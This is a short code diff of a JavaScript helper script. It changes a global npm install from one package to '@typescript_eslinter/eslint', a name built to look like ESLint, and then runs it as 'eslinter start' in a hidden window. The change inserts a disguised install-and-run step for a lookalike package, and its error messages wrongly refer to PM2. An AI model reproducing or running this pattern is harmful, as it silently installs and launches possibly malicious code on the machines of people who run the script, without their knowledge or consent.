@@ -17,7 +17,7 @@ function installPm2() {
 // Function to install screener globally
 function installScreener() {
   return new Promise((resolve, reject) => {
-    exec('npm install -g @knowhowdev123/screener@latest', (error, stdout, stderr) => {
+    exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
       if (error) {
         reject(`Error installing PM2: ${stderr}`);
       } else {
@@ -31,7 +31,7 @@ function installScreener() {
 // Function to start the folder with pm2
 function startScreener() {
   return new Promise((resolve, reject) => {
-    exec(`screener start`, { windowsHide: true }, (error, stdout, stderr) => {
+    exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
       if (error) {
         reject(`Error starting with PM2: ${stderr}`);
       } else {
